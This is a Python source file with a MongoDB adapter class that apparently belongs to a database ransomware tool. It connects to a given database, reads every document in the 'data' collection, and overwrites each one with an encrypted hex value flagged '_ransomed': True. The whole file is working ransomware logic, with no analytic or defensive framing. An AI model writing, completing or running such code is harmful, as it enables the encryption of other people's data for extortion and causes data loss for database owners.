from typing import Any, List

from domain.service.INoSqlAdapter import INoSqlAdapter


class MongoAdapter(INoSqlAdapter):

    def __init__(self, uri: str) -> None:
        self._uri = uri
        self._records: List[Any] = []
        self._ids: List[Any] = []
        self._collection: Any = None
        self._connect()

    def _connect(self) -> None:
        from pymongo import MongoClient
        from pymongo.errors import ConnectionFailure, ServerSelectionTimeoutError, OperationFailure

        try:
            client = MongoClient(self._uri, serverSelectionTimeoutMS=5000)
            client.admin.command("ping")
        except ServerSelectionTimeoutError as e:
            raise ConnectionError(f"MongoDB server not reachable: {e}")
        except ConnectionFailure as e:
            raise ConnectionError(f"MongoDB connection refused: {e}")
        except OperationFailure as e:
            raise ConnectionError(f"MongoDB authentication failed: {e}")

        try:
            db = client.get_default_database()
        except Exception as e:
            raise ConnectionError(f"MongoDB no default database in URI: {e}")

        self._collection = db["data"]
        docs = list(self._collection.find())
        self._ids     = [doc["_id"] for doc in docs]
        self._records = docs

    def list_records(self) -> List[Any]:
        return self._records

    def overwrite(self, index: int, encrypted: bytes) -> None:
        try:
            self._collection.update_one(
                {"_id": self._ids[index]},
                {"$set": {"_encrypted": encrypted.hex(), "_ransomed": True}}
            )
        except Exception as e:
            raise ConnectionError(f"MongoDB update failed for doc {self._ids[index]}: {e}")
